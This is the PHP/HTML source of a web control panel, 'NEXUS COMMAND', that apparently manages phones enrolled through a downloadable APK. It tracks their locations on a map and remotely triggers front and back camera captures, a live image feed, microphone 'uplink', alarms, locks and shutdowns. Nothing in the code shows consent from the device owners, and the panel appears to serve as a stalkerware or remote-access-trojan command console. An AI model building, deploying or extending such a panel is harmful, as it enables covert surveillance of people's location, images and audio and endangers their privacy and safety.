<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GeoTrack Pro - Mission Control</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        #sidebar { width: 420px; background-color: #161b22; border-right: 1px solid #30363d; display: flex; flex-direction: column; z-index: 1000; }
        #map-container { flex-grow: 1; position: relative; }
        #map { height: 100%; width: 100%; }
        
        .header { padding: 25px; border-bottom: 1px solid #30363d; display: flex; flex-direction: column; align-items: flex-start; gap: 10px; }
        .branding { display: flex; align-items: center; gap: 15px; width: 100%; }
        .logo { width: 45px; height: 45px; background: linear-gradient(135deg, #238636, #2ea043); border-radius: 12px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(35, 134, 54, 0.3); }
        .logo-icon { width: 25px; height: 25px; fill: white; }
        .branding h1 { font-size: 18px; margin: 0; color: #58a6ff; letter-spacing: 0.5px; text-transform: uppercase; }
        .header-meta { display: flex; justify-content: space-between; width: 100%; align-items: center; }
        .logout { color: #8b949e; text-decoration: none; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
        .logout:hover { color: #58a6ff; }

        .device-list { flex-grow: 1; overflow-y: auto; padding: 0; }
        .nexus-table { width: 100%; border-collapse: collapse; font-size: 11px; }
        .nexus-table th { text-align: left; padding: 12px 15px; background: #0d1117; border-bottom: 1px solid #30363d; color: #8b949e; text-transform: uppercase; font-size: 9px; letter-spacing: 1px; position: sticky; top: 0; }
        .nexus-table td { padding: 12px 15px; border-bottom: 1px solid #21262d; cursor: pointer; transition: 0.1s; }
        .nexus-table tr:hover td { background: #1c2128; }
        .nexus-table tr.active td { background: #1c2128; border-left: 3px solid #238636; }
        
        .status-pill { padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 8px; text-transform: uppercase; display: inline-flex; align-items: center; gap: 4px; }
        .pill-online { color: #3fb950; background: rgba(63, 185, 80, 0.1); border: 1px solid rgba(63, 185, 80, 0.2); }
        .pill-offline { color: #f85149; background: rgba(248, 81, 73, 0.1); border: 1px solid rgba(248, 81, 73, 0.2); }
        .status-dot { width: 5px; height: 5px; border-radius: 50%; }
        .dot-online { background: #3fb950; box-shadow: 0 0 5px #3fb950; }
        .dot-offline { background: #f85149; }

        .controls { padding: 20px; border-top: 1px solid #30363d; background-color: #161b22; display: none; }
        .control-group { margin-bottom: 15px; }
        .control-label { font-size: 10px; color: #8b949e; margin-bottom: 8px; display: block; text-transform: uppercase; letter-spacing: 1.5px; font-weight: bold; }
        .btn-row { display: flex; gap: 8px; }
        button { flex-grow: 1; padding: 10px; border-radius: 6px; border: 1px solid #30363d; background-color: #21262d; color: #c9d1d9; font-size: 11px; font-weight: 600; cursor: pointer; transition: 0.1s; display: flex; align-items: center; justify-content: center; gap: 6px; }
        button:hover { background-color: #30363d; border-color: #8b949e; }
        button.active { background-color: #1f6feb; border-color: #388bfd; color: white; }
        button.danger { color: #f85149; }
        button.danger:hover { background-color: #f85149; color: white; border-color: #f85149; }

        .camera-preview-container { width: 100%; border-radius: 8px; margin-top: 15px; border: 1px solid #30363d; position: relative; overflow: hidden; display: none; background: black; }
        .camera-preview { width: 100%; display: block; }
        .preview-overlay { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.6); padding: 4px 8px; border-radius: 4px; font-size: 10px; color: #3fb950; font-family: monospace; }

        .add-device-section { padding: 20px; border-top: 1px solid #30363d; background-color: #0d1117; text-align: center; }
        .qr-card { background: #161b22; padding: 15px; border-radius: 12px; border: 1px solid #30363d; margin-top: 10px; display: none; }
        .qr-code { width: 150px; height: 150px; background: white; padding: 10px; border-radius: 8px; margin: 0 auto 10px; }
        .qr-card p { font-size: 11px; color: #8b949e; margin: 0; }
    </style>
</head>
<body>
    <div id="sidebar">
        <div class="header">
            <div class="branding">
                <div class="logo">
                    <svg class="logo-icon" viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                </div>
                <h1>NEXUS COMMAND</h1>
            </div>
            <div class="header-meta">
                <span id="system-time" style="font-size: 11px; color: #8b949e; font-family: monospace;">00:00:00</span>
                <a href="logout" class="logout">Secure Exit</a>
            </div>
        </div>
        <div class="device-list" id="device-list">
            <!-- Table will be loaded here -->
        </div>
        
        <div class="controls" id="controls">
            <div class="control-group">
                <span class="control-label">Visual Intelligence</span>
                <div class="btn-row">
                    <button onclick="sendCommand('camera', 'back')" id="btn-cam-back">BACK CAM</button>
                    <button onclick="sendCommand('camera', 'front')" id="btn-cam-front">FRONT CAM</button>
                    <button onclick="togglePreview()" id="btn-preview">LIVE FEED</button>
                </div>
                <div id="preview-container" class="camera-preview-container">
                    <div class="preview-overlay">LIVE SIGNAL // ENCRYPTED</div>
                    <img id="camera-frame" class="camera-preview" src="" />
                </div>
            </div>
            <div class="control-group">
                <span class="control-label">Acoustic Monitoring</span>
                <div class="btn-row">
                    <button onclick="sendCommand('audio', 'on')" id="btn-audio-on">UPLINK</button>
                    <button onclick="sendCommand('audio', 'off')" id="btn-audio-off">SILENCE</button>
                    <button onclick="sendCommand('alarm', 'on')" class="danger">FORCE ALARM</button>
                </div>
            </div>
            <div class="control-group">
                <span class="control-label">Nexus Protocol</span>
                <div class="btn-row">
                    <button onclick="sendCommand('power', 'lock')">LOCK</button>
                    <button onclick="sendCommand('power', 'reboot')" class="danger">REBOOT</button>
                    <button onclick="sendCommand('power', 'disconnect')" class="danger" style="background:#da3633; border-color:#f85149;">MASTER SHUTDOWN</button>
                </div>
            </div>
        </div>

        <div class="add-device-section">
            <button onclick="toggleAddDevice()" style="background: transparent; border-color: #238636; color: #3fb950;">+ ENROLL NEW AGENT</button>
            <div id="qr-card" class="qr-card">
                <div class="qr-code" id="qr-container">
                    <?php
                        $latest = "9.8.6"; // LATEST STABLE
                        $v_file = __DIR__ . "/Updateapk/version.txt";
                        if (file_exists($v_file)) { $latest = trim(file_get_contents($v_file)); }
                        $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
                        $download_link = "$proto://" . $_SERVER['HTTP_HOST'] . "/download?v=$latest";
                        $qr_url = "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=" . urlencode($download_link);
                        echo "<img src='$qr_url' alt='Nexus Enrollment QR' style='width:100%; height:100%;' />";
                    ?>
                </div>
                <p>Scan to deploy Nexus Direct v<?php echo $latest; ?></p>
                <div style="margin-top:10px;">
                    <a href="/download?v=<?php echo $latest; ?>" style="color:#58a6ff; font-size:11px; text-decoration:none; font-weight:bold;">[ DIRECT DOWNLOAD v<?php echo $latest; ?> ]</a>
                </div>
            </div>
        </div>
    </div>
    <div id="map-container">
        <div id="map"></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map = L.map('map', { zoomControl: false }).setView([0, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '© OpenStreetMap contributors © CARTO'
        }).addTo(map);
        L.control.zoom({ position: 'bottomright' }).addTo(map);

        let markers = {};
        let selectedDeviceId = null;
        let previewActive = false;

        function updateTime() { document.getElementById('system-time').innerText = new Date().toLocaleTimeString('en-GB'); }
        setInterval(updateTime, 1000);

        function fetchDevices() {
            fetch('/ajax?action=get_devices')
                .then(r => r.json())
                .then(data => {
                    const list = document.getElementById('device-list');
                    let html = `
                        <table class="nexus-table">
                            <thead>
                                <tr>
                                    <th>Agent</th>
                                    <th>Status</th>
                                    <th>Link</th>
                                    <th>Ver</th>
                                </tr>
                            </thead>
                            <tbody>
                    `;
                    
                    data.forEach(dev => {
                        const isOnline = dev.is_online;
                        html += `
                            <tr class="${selectedDeviceId === dev.device_id ? 'active' : ''}" onclick="selectDevice('${dev.device_id}', ${dev.lat}, ${dev.lon})">
                                <td style="color:#58a6ff; font-weight:600;">${dev.name}</td>
                                <td><span class="status-pill ${isOnline ? 'pill-online' : 'pill-offline'}"><span class="status-dot ${isOnline ? 'dot-online' : 'dot-offline'}"></span>${isOnline ? 'ONLINE' : 'OFFLINE'}</span></td>
                                <td style="color:#8b949e;">${isOnline ? 'DIRECT' : 'NONE'}</td>
                                <td style="font-family:monospace; color:#30363d; font-size:9px;">${dev.version || '9.8.5'}</td>
                            </tr>
                        `;

                        if (dev.lat != 0) {
                            if (!markers[dev.device_id]) {
                                markers[dev.device_id] = L.circleMarker([dev.lat, dev.lon], {
                                    radius: 8, fillColor: isOnline ? "#3fb950" : "#f85149", color: "#fff", weight: 2, opacity: 1, fillOpacity: 0.8
                                }).addTo(map).bindPopup(`<b>${dev.name}</b>`);
                            } else {
                                markers[dev.device_id].setLatLng([dev.lat, dev.lon]);
                                markers[dev.device_id].setStyle({ fillColor: isOnline ? "#3fb950" : "#f85149" });
                            }
                        }
                    });
                    html += '</tbody></table>';
                    if (data.length === 0) html = '<div style="text-align:center; padding:20px; color:#8b949e;">Waiting for Nexus uplink...</div>';
                    list.innerHTML = html;
                    
                    if (previewActive && selectedDeviceId) {
                        document.getElementById('camera-frame').src = 'uploads/' + selectedDeviceId + '.jpg?t=' + new Date().getTime();
                    }
                });
        }

        function selectDevice(id, lat, lon) {
            selectedDeviceId = id;
            document.getElementById('controls').style.display = 'block';
            if (lat != 0) map.panTo([lat, lon]);
            fetchDevices();
        }

        function sendCommand(type, value) {
            if (!selectedDeviceId) return;
            fetch('/ajax?action=send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: selectedDeviceId, type: type, value: value })
            });
        }

        function togglePreview() {
            previewActive = !previewActive;
            const container = document.getElementById('preview-container');
            const btn = document.getElementById('btn-preview');
            container.style.display = previewActive ? 'block' : 'none';
            btn.classList.toggle('active', previewActive);
        }

        function toggleAddDevice() {
            const card = document.getElementById('qr-card');
            card.style.display = card.style.display === 'block' ? 'none' : 'block';
        }

        setInterval(fetchDevices, 2000);
        fetchDevices();
    </script>
</body>
</html>
